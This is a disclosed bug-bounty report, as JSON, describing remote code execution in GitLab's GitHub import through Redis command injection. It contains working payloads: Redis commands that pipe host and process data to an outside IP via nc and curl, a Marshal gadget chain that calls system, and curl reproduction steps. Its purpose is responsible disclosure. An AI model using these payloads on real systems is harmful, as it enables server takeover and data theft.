{
  "id": 1672388,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNjcyMzg4",
  "url": "https://hackerone.com/reports/1672388",
  "title": "RCE via github import",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "critical",
  "readable_substate": "Resolved",
  "created_at": "2022-08-17T12:18:56.586Z",
  "submitted_at": "2022-08-17T12:18:56.726Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "yvvdwf",
    "url": "/yvvdwf",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/ubqmt760dugarh527x4qc4mkdn4n/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98"
    },
    "is_me?": false,
    "cleared": false,
    "verified": true,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 264,
    "url": "https://hackerone.com/gitlab",
    "handle": "gitlab",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/f0hovtq73f9ap815a0r1w42bocp4/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/f0hovtq73f9ap815a0r1w42bocp4/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "GitLab",
      "twitter_handle": "gitlab",
      "website": "https://about.gitlab.com",
      "about": "A single application for the entire software development lifecycle."
    }
  },
  "has_bounty?": true,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2022-11-16T01:10:35.826Z",
  "bug_reporter_agreed_on_going_public_at": "2022-11-04T16:48:31.864Z",
  "team_member_agreed_on_going_public_at": "2022-11-16T01:10:35.668Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "Hello,\n\nWhile continuing mining on [github import](https://hackerone.com/reports/1665658), I found a vulnerability on gitlab.com allowing to execute remotely arbitrary commands.\n\nGitlab uses Octokit to get data from github.com. Octokit uses [Sawyer::Resource](https://github.com/lostisland/sawyer/blob/master/lib/sawyer/resource.rb) to represent results.\n\nSawyer is a crazy class that [converts](https://github.com/lostisland/sawyer/blob/f5f080d5c5260e094069139ffc7c13d0acba4ab5/lib/sawyer/resource.rb#L81) a hash to an object whose methods are based on the hash's key:\n\n```ruby\nirb(main):641:0> Sawyer::VERSION\n=> \"0.8.2\"\nirb(main):642:0> a = Sawyer::Resource.new( Sawyer::Agent.new(\"\"), to_s: \"example\", length: 1)\n=> \n{:to_s=>\"example\", :length=>1}\n...\nirb(main):643:0> a.to_s\n=> \"example\"\nirb(main):644:0> a.length\n=> 1\n```\n\nGitlab uses directly the responded Sawyer object in few functions, such as, the `id` variable in [this function](https://gitlab.com/gitlab-org/gitlab/-/blob/99f5db917a33ad9466f35918a1da454ed397be8e/lib/gitlab/github_import/parallel_scheduling.rb#L145):\n\n```ruby\n      def already_imported?(object)\n        id = id_for_already_imported_cache(object)\n\n        Gitlab::Cache::Import::Caching.set_includes?(already_imported_cache_key, id)\n      end\n```\n\nNormally, `id` should be a number. However when `id` is `{\"to_s\": {\"bytesize\": 2, \"to_s\": \"1234REDIS_COMMANDS\" }}`, we can inject additional redis commands by using `bytesize` to limit the previous command when it [is constructed](https://github.com/redis/redis-rb/blob/v4.4.0/lib/redis/connection/command_helper.rb#L8) (although the `bytesize` is `2` we need to reserve 4 bytes as 2 additional bytes for CLRF):\n\n```ruby\n      def build_command(args)\n        command = [nil]\n\n        args.each do |i|\n          if i.is_a? Array\n            i.each do |j|\n              j = j.to_s\n              command << \"$#{j.bytesize}\"\n              command << j\n            end\n          else\n            i = i.to_s\n            command << \"$#{i.bytesize}\"\n            command << i\n          end\n        end\n```\n\nAs we can execute any redis commands, we can escalate to execute any Bash command by using an existing gadget, for example:\n\n```\nlpush resque:gitlab:queue:system_hook_push \"{\\\"class\\\":\\\"GitlabShellWorker\\\",\\\"args\\\":[\\\"class_eval\\\",\\\"open(\\'| (hostname; ps aux)  | nc 51.75.74.52 11211  \\').read\\\"],\"queue\\\":\\\"system_hook_push\\\"}\"\n```\n\nI tested this redis command first on my own gitlab instance and it worked. \n\nI then tested on gitlab.com but got nothing. I tried another by replacing basically `nc` by `curl` but no luck:\n\n```\n lpush resque:gitlab:queue:system_hook_push \"{\\\"class\\\":\\\"PagesWorker\\\",\\\"args\\\":[\\\"class_eval\\\",\\\"IO.read('|(hostname; ps aux) | curl 51.75.74.52:11211 -X POST --data-binary @-  ')\\\"], \\\"queue\\\":\\\"system_hook_push\\\"}\"\n```\n\nAlthough the gadget above works well on my local instance but gitlab SaaS which may be protected somehow or used another redis namespace for Sidekiq, even another redis instance. So I used then the basic redis command `REPLICAOF 51.75.74.52 11211\\n\\n` to test gitlab.com and I got a ping from your redis server to my server `nc -vlkp 11211`:\n\n{F1871024}\n\nThis means that I have the full control on the redis. After seeing the pings, I immediately turned off the replication by executing the redis command `REPLICAOF no one\\n\\n`. No information from your redis server has been replicated to mine as I used `nc` and I got only the `ping` messages.\n\n\nBy checking on my local instance at `/var/opt/gitlab/redis/redis.conf`, I see that only `keys` command is disable. I did not try `FLUSHALL` to write data to file as it is too dangerous.\n\nAs gitlab uses redis as a cache storage, so I tried to reach RCE via `Marshal.dump` method. I tested the following payload on gitlab.com to poison the avatar of my project via the key `cache:gitlab:avatar:yvvdwf/xss:16210710`:\n\n```\n\\r\\n*3\\r\\n$3\\r\\nset\\r\\n$39\\r\\ncache:gitlab:avatar:yvvdwf/xss:16210710\\r\\n$347\\r\\n\\u0004\\b[\\bc\\u0015Gem::SpecFetcherc\\u0013Gem::InstallerU:\\u0015Gem::Requirement[\\u0006o:\\u001cGem::Package::TarReader\\u0006:\\b@ioo:\\u0014Net::BufferedIO\\u0007;\\u0007o:#Gem::Package::TarReader::Entry\\u0007:\\n@readi\\u0000:\\f@headerI\\\"\\u0006a\\u0006:\\u0006ET:\\u0012@debug_outputo:\\u0016Net::WriteAdapter\\u0007:\\f@socketo:\\u0014Gem::RequestSet\\u0007:\\n@setso;\\u000e\\u0007;\\u000fm\\u000bKernel:\\u000f@method_id:\\u000bsystem:\\r@git_setI\\\".(hostname; ps aux) | nc 51.75.74.52 11211\\u0006;\\fT;\\u0012:\\fresolve\\r\\n\\r\\n\n```\n\nAlthough I did not get RCE but it seems working as I got `500` error code when trying to access to my project. And now I cannot access to my project via web interface. I think I should stop testing to avoid any further potential incidences. I did all the tests above on gitlab.com on 16-17 August 2022 from IP `51.75.74.52`\n\n{F1871025}\n\n# Steps to reproduce\n\nThe steps to reproduce should be the same as this [one](https://hackerone.com/reports/1665658)\n\nThe following steps are to reproduce on a local gitlab instance whose domain is `http://gitlab.example.com`:\n\n# Step to reproduce\n\nTo reproduce, we need the following prerequisite: \n\n- A VM/machine to host the dummy server  with an public IP though that gitlab.example.com can access to (or you can configure your gitlab instance to allow to access to local networks)\n- I created the dummy server using nodejs, so you need to have also nodejs on the machine\n- A Gitlab personal access token. Go to http://gitlab.example.com/-/profile/personal_access_tokens?scopes=api to create a new token with within `api` scope.\n\n\n# Step 1: run the dummy server\n\n- Copy the attachment file on your machine and decompress it to any folder, e.g., `/tmp/dummy-server`\n- *Modify the attack payload* as you need inside `redis_command.txt` file, the default value is to execute the command `(hostname; ps aux) > /tmp/ahihi`:\n```\n lpush resque:gitlab:queue:system_hook_push \"{\\\"class\\\":\\\"PagesWorker\\\",\\\"args\\\":[\\\"class_eval\\\",\\\"IO.read('|(hostname; ps aux) > /tmp/ahihi ')\\\"], \\\"queue\\\":\\\"system_hook_push\\\"}\"\n```\n- Go to `/tmp/dummy-server` then run this command: `node ./index.js YOUR_IP YOUR_PORT` in which, you should replace `IP` and `PORT` with the one you have. For example, `sudo node index.js 51.75.74.52 80`\n\n# Step 2: trigger Gitlab import\n\n- Open a new terminal, then run the following command, in which:\n\n   + `YOUR_IP` and `YOUR_PORT` are the values in the previous step\n   + `YOUR_GITLAB_TOKEN` is the api token you've created in the pre-requirement\n   + `YOUR_GITLAB_USERNAME` is the target namespace you want to import the project to. It can be your username, or a group name\n\n```bash\ncurl -kv \"http://gitlab.example.com/api/v4/import/github\" \\\n  --request POST \\\n  --header \"content-type: application/json\" \\\n  --header \"PRIVATE-TOKEN: YOUR_GITLAB_TOKEN\" \\\n  --data '{\n    \"personal_access_token\": \"ghp_aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\",\n    \"repo_id\": \"356289002\",\n    \"target_namespace\": \"YOUR_GITLAB_USERNAME\",\n    \"new_name\": \"poc-rce\",\n    \"github_hostname\": \"http://YOUR_IP:YOUR_PORT\"\n}'\n```\n\nFor example:\n\n```bash\ncurl \"http://gitlab.example.com/api/v4/import/github\" \\\n  --request POST \\\n  --header \"content-type: application/json\" \\\n  --header \"PRIVATE-TOKEN: 3LCvKWXVF-Gadcnbxxxx\" \\\n  --data '{\n    \"personal_access_token\": \"xxxxx\",\n    \"repo_id\": \"356289002\",\n    \"target_namespace\": \"root\",\n    \"new_name\": \"NEW-NAME-'$(date +%s)'\",\n    \"github_hostname\": \"http://ns.yvvdwf.me:80\"\n}'\n```\n\n- View the result in `/etc/ahihi`\n\n## Impact\n\nAny one the the ability to call `api/v4/import/github` endpoint could achieve RCE via a specially crafted responses",
  "weakness": {
    "id": 59,
    "name": "OS Command Injection"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [
    {
      "id": 1871024,
      "file_name": "redis_replicaof.png",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/z6sgzmwezby006npwc9j0ldbjn1u?response-content-disposition=attachment%3B%20filename%3D%22redis_replicaof.png%22%3B%20filename%2A%3DUTF-8%27%27redis_replicaof.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQTJFGACUK%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T142927Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQC3Tuf8wTsJ6HgA%2BHqgp20HmgXBHMAQ4OqTlZ9OWuKgBAIhAOvE8XTU%2BSdcCSz5sVQojGBmKatUQGh%2FA44vLbcP%2Fm%2BUKrIFCHcQAxoMMDEzNjE5Mjc0ODQ5IgzTJhZOFm4GMgT4x1sqjwW0Te4aWJuWaHDaUOwX6BTUT%2BWVM7TuVfL8jOUvJxOlkS5Lf9jEW4%2BJe6myFMRPfV3cl1jHvXdCpoZr1VDiUBakEFhwbZYmiggKueZ0JgXLv54dWJdSFx9%2BtHXdqHC5YIw8pd87hEyCWO0WVSMpU0BwL2LA12LitDPxLhy%2B1P1MKa4B8%2BolMTizbUobGSsjQpn0J03hOTYz0qMWq%2FrQBiVm4PkGhIKoPogNoueiK1FvIuGSZcrBW7I2morIEv%2B4RhCIO%2FtWPjY1Fb8vi9NQA3nVCyQ5tdSqOepqkBTUxeoREnHEvrBmcoYQDjb7R%2B0W6sA68Njxz3CqAehylnajasZOJ2DEtuipCSGNuiZSMQvkMyWdJPuUvbCwj3Hi4v9k4CyGrxZE5lIlr7fEPofWh5bufWhEAaVokadugrpSNkxC9ixU7g5OW72Npc4%2B%2FNJVwHUNDMfB4%2BqEHwn78jEGr058QH5MJiTtGFgjqIAO%2BqKsudB%2BrUHqDGsSqwTMqLSKDzvoTA7asoZMtr4dX1qcP9FXNNgHeMbOPYpPYHxGE8LY7AtAVgJMRwVF9aXrKF6vuFcFCvFIkCvLe1cE%2BJA%2Fng51Fzl0pkQmrdUa9Q%2Bh0BBJEUGLxzgjbpmEYBQBbJtSmYE1zOUsBLqKMaP%2F89PSSIxtWO6EXcpdND9bY71nEm%2FnTCVm6eR2IhxLleobZcD%2B8IUEahLjhTIcHxHghoAcOD1LC1WptK97c4lcGIkxUvzK2vkMdF4%2BWJCwwx%2B2lXSVUzCL2tvwxa%2BbkZ%2FJMvfgSy8rgkVG%2Fc7pzQKgoq3bEEnI4zhQJFANhNg8Lfec1FA1jO%2FvLzqoKR0Bla7K0r9BN%2Bxx5t5GDyGWAX4%2BdZIbMHbSMKn1ra4GOrAB%2BHYBGCq1%2BXZHyPtMlkND6b47v1CWX0jODxdKSccUpq9J1lB8OTDs8mvUAytBUPQZIFFXueEQhrZOc6CniIEFp1YyioNPcbCjcoDKzh9umDgfiq%2FemPxWdVqSpUn3piAIl5iFC704ZMHpEM68pz0ePrup8Ej3liid1kztmk2d82LQRl4AOLmnFNfmSk1j%2Fm0m8fsw96lJbJTcdjYiCigdYCatevndBo6m5MO1WyoxPtw%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=457d9a93758dc7f9d6667c082623a93f3f4be95ba0640ce2348e81fc17ff2b6a",
      "file_size": 52874,
      "type": "image/png",
      "moderated": null
    },
    {
      "id": 1871025,
      "file_name": "something_went_wrong.png",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/xoox16h9axvyujjvuaz68uysc1x0?response-content-disposition=attachment%3B%20filename%3D%22something_went_wrong.png%22%3B%20filename%2A%3DUTF-8%27%27something_went_wrong.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQTJFGACUK%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T142927Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQC3Tuf8wTsJ6HgA%2BHqgp20HmgXBHMAQ4OqTlZ9OWuKgBAIhAOvE8XTU%2BSdcCSz5sVQojGBmKatUQGh%2FA44vLbcP%2Fm%2BUKrIFCHcQAxoMMDEzNjE5Mjc0ODQ5IgzTJhZOFm4GMgT4x1sqjwW0Te4aWJuWaHDaUOwX6BTUT%2BWVM7TuVfL8jOUvJxOlkS5Lf9jEW4%2BJe6myFMRPfV3cl1jHvXdCpoZr1VDiUBakEFhwbZYmiggKueZ0JgXLv54dWJdSFx9%2BtHXdqHC5YIw8pd87hEyCWO0WVSMpU0BwL2LA12LitDPxLhy%2B1P1MKa4B8%2BolMTizbUobGSsjQpn0J03hOTYz0qMWq%2FrQBiVm4PkGhIKoPogNoueiK1FvIuGSZcrBW7I2morIEv%2B4RhCIO%2FtWPjY1Fb8vi9NQA3nVCyQ5tdSqOepqkBTUxeoREnHEvrBmcoYQDjb7R%2B0W6sA68Njxz3CqAehylnajasZOJ2DEtuipCSGNuiZSMQvkMyWdJPuUvbCwj3Hi4v9k4CyGrxZE5lIlr7fEPofWh5bufWhEAaVokadugrpSNkxC9ixU7g5OW72Npc4%2B%2FNJVwHUNDMfB4%2BqEHwn78jEGr058QH5MJiTtGFgjqIAO%2BqKsudB%2BrUHqDGsSqwTMqLSKDzvoTA7asoZMtr4dX1qcP9FXNNgHeMbOPYpPYHxGE8LY7AtAVgJMRwVF9aXrKF6vuFcFCvFIkCvLe1cE%2BJA%2Fng51Fzl0pkQmrdUa9Q%2Bh0BBJEUGLxzgjbpmEYBQBbJtSmYE1zOUsBLqKMaP%2F89PSSIxtWO6EXcpdND9bY71nEm%2FnTCVm6eR2IhxLleobZcD%2B8IUEahLjhTIcHxHghoAcOD1LC1WptK97c4lcGIkxUvzK2vkMdF4%2BWJCwwx%2B2lXSVUzCL2tvwxa%2BbkZ%2FJMvfgSy8rgkVG%2Fc7pzQKgoq3bEEnI4zhQJFANhNg8Lfec1FA1jO%2FvLzqoKR0Bla7K0r9BN%2Bxx5t5GDyGWAX4%2BdZIbMHbSMKn1ra4GOrAB%2BHYBGCq1%2BXZHyPtMlkND6b47v1CWX0jODxdKSccUpq9J1lB8OTDs8mvUAytBUPQZIFFXueEQhrZOc6CniIEFp1YyioNPcbCjcoDKzh9umDgfiq%2FemPxWdVqSpUn3piAIl5iFC704ZMHpEM68pz0ePrup8Ej3liid1kztmk2d82LQRl4AOLmnFNfmSk1j%2Fm0m8fsw96lJbJTcdjYiCigdYCatevndBo6m5MO1WyoxPtw%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=7abd5e96ffbfbb028af62d53801706b962eb9cef759e93ceb7a682f8581d0ddc",
      "file_size": 376187,
      "type": "image/png",
      "moderated": null
    },
    {
      "id": 1871041,
      "file_name": "rce.tar.gz",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/dn1a438rwug9y3w2x4ycf36sr972?response-content-disposition=attachment%3B%20filename%3D%22rce.tar.gz%22%3B%20filename%2A%3DUTF-8%27%27rce.tar.gz&response-content-type=application%2Fgzip&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQTJFGACUK%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T142927Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQC3Tuf8wTsJ6HgA%2BHqgp20HmgXBHMAQ4OqTlZ9OWuKgBAIhAOvE8XTU%2BSdcCSz5sVQojGBmKatUQGh%2FA44vLbcP%2Fm%2BUKrIFCHcQAxoMMDEzNjE5Mjc0ODQ5IgzTJhZOFm4GMgT4x1sqjwW0Te4aWJuWaHDaUOwX6BTUT%2BWVM7TuVfL8jOUvJxOlkS5Lf9jEW4%2BJe6myFMRPfV3cl1jHvXdCpoZr1VDiUBakEFhwbZYmiggKueZ0JgXLv54dWJdSFx9%2BtHXdqHC5YIw8pd87hEyCWO0WVSMpU0BwL2LA12LitDPxLhy%2B1P1MKa4B8%2BolMTizbUobGSsjQpn0J03hOTYz0qMWq%2FrQBiVm4PkGhIKoPogNoueiK1FvIuGSZcrBW7I2morIEv%2B4RhCIO%2FtWPjY1Fb8vi9NQA3nVCyQ5tdSqOepqkBTUxeoREnHEvrBmcoYQDjb7R%2B0W6sA68Njxz3CqAehylnajasZOJ2DEtuipCSGNuiZSMQvkMyWdJPuUvbCwj3Hi4v9k4CyGrxZE5lIlr7fEPofWh5bufWhEAaVokadugrpSNkxC9ixU7g5OW72Npc4%2B%2FNJVwHUNDMfB4%2BqEHwn78jEGr058QH5MJiTtGFgjqIAO%2BqKsudB%2BrUHqDGsSqwTMqLSKDzvoTA7asoZMtr4dX1qcP9FXNNgHeMbOPYpPYHxGE8LY7AtAVgJMRwVF9aXrKF6vuFcFCvFIkCvLe1cE%2BJA%2Fng51Fzl0pkQmrdUa9Q%2Bh0BBJEUGLxzgjbpmEYBQBbJtSmYE1zOUsBLqKMaP%2F89PSSIxtWO6EXcpdND9bY71nEm%2FnTCVm6eR2IhxLleobZcD%2B8IUEahLjhTIcHxHghoAcOD1LC1WptK97c4lcGIkxUvzK2vkMdF4%2BWJCwwx%2B2lXSVUzCL2tvwxa%2BbkZ%2FJMvfgSy8rgkVG%2Fc7pzQKgoq3bEEnI4zhQJFANhNg8Lfec1FA1jO%2FvLzqoKR0Bla7K0r9BN%2Bxx5t5GDyGWAX4%2BdZIbMHbSMKn1ra4GOrAB%2BHYBGCq1%2BXZHyPtMlkND6b47v1CWX0jODxdKSccUpq9J1lB8OTDs8mvUAytBUPQZIFFXueEQhrZOc6CniIEFp1YyioNPcbCjcoDKzh9umDgfiq%2FemPxWdVqSpUn3piAIl5iFC704ZMHpEM68pz0ePrup8Ej3liid1kztmk2d82LQRl4AOLmnFNfmSk1j%2Fm0m8fsw96lJbJTcdjYiCigdYCatevndBo6m5MO1WyoxPtw%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=abf32a1a061984f9bebf221b7adc587fa406c49b6f023d03426d415da9f5a4d0",
      "file_size": 5112,
      "type": "application/gzip",
      "moderated": null
    }
  ],
  "allow_singular_disclosure_at": null,
  "vote_count": 261,
  "voters": [
    "omarelfarsaoui",
    "math-lover",
    "randomrootx",
    "svalkanov",
    "green-jam",
    "jumpydata",
    "shreyaschavhan",
    "napkin",
    "inspector-ambitious",
    "bulldawg",
    "and 251 more..."
  ],
  "severity": {
    "rating": "critical",
    "score": 9.9,
    "author_type": "Team",
    "metrics": {
      "attack_vector": "network",
      "attack_complexity": "low",
      "privileges_required": "low",
      "user_interaction": "none",
      "scope": "changed",
      "confidentiality": "high",
      "integrity": "high",
      "availability": "high"
    }
  },
  "structured_scope": {
    "databaseId": 39022,
    "asset_type": "OTHER",
    "asset_identifier": "Your Own GitLab Instance",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
